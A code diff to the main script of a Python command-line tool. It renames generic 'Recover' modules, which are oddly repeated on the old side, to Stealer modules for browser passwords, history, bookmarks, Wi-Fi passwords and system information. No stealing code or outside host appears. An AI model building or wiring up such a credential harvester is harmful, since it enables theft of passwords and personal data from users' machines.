@@ -4,9 +4,9 @@ import argparse
 from config import Constant
 from config import Colors
 
-from modules import ChromiumRecover, Recover, Recover # browser
-from modules import Recover, Recover # network
-from modules import Recover # system
+from modules import ChromiumStealer, WebHistoryStealer, WebBookmarksStealer # browser
+from modules import NetworkInfoStealer, WifiPasswordStealer # network
+from modules import SystemInfoStealer # system
 
 
 def parser():
@@ -107,22 +107,22 @@ def main():
     parser()
     
     if Constant.Args.browser_passwords:
-        ChromiumRecover().run()
+        ChromiumStealer().run()
     
     if Constant.Args.browser_history:
-        Recover().run()
+        WebHistoryStealer().run()
     
     if Constant.Args.browser_bookmakrs:
-        Recover().run()
+        WebBookmarksStealer().run()
     
     if Constant.Args.network_wifi:
-        Recover().run()
+        WifiPasswordStealer().run()
     
     if Constant.Args.network_info:
-        Recover().run()
+        NetworkInfoStealer().run()
     
     if Constant.Args.system_all:
-        Recover().run()
+        SystemInfoStealer().run()
     
     cexit()
 
